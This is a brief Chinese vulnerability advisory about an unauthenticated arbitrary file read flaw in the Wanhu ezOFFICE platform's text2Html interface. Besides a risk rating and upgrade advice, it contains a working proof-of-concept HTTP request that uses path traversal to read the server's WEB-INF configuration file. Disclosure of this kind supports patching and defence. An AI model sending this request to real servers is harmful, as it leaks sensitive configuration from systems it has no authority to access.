#  漏洞预警 | 万户ezOFFICE任意文件读取漏洞   
原创 浅安  浅安安全   2024-01-27 08:00  
  
**0x00 漏洞编号**  
- # 暂无  
  
**0x01 危险等级**  
- 高危  
  
**0x02 漏洞概述**  
  
万户ezOFFICE协同管理平台是一个综合信息基础应用平台分为企业版和政务版。解决方案由五大应用、两个支撑平台组成，分别为知识管理、工作流程、沟通交流、辅助办公、集成解决方案及应用支撑平台、基础支撑平台。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/7stTqD182SVeemR7wLPNZGZtdPjw4eLqOVVq8ryDyFuM9m1TXH2Sy7dMzlFrVt1Yf6Fz75gLLqAwmxy3IrxzVg/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**0x03 漏洞详情**  
  
**漏洞类型：**  
任意文件读取  
  
**影响：**  
获取敏感信息  
  
**简述：**  
万户ezOFFICE协同管理平台text2Htm接口处存在任意文件读取漏洞，未经身份认证的攻击者可以通过此漏洞读取敏感文件。  
###   
  
**0x04 影响版本**  
- 万户ezOFFICE  
  
**0x05****POC**  
```
POST /defaultroot/convertFile/text2Html.controller HTTP/1.1
Host: {host}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36
Connection: close
Content-Length: 75
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
SL-CE-SUID: 1081

saveFileName=1/../../../../WEB-INF/config/whconfig.xml&moduleName=html
```  
  
  
**仅供安全研究与学习之用，若将工具做其他用途，由使用者承担全部法律及连带责任，作者及发布****者**  
**不承担任何法律及连带责任。**  
  
**0x06****修复建议**  
  
**目前官方已发布漏洞修复版本，建议用户升级到安全版本****：**  
  
https://www.whir.net/  
  
  
  
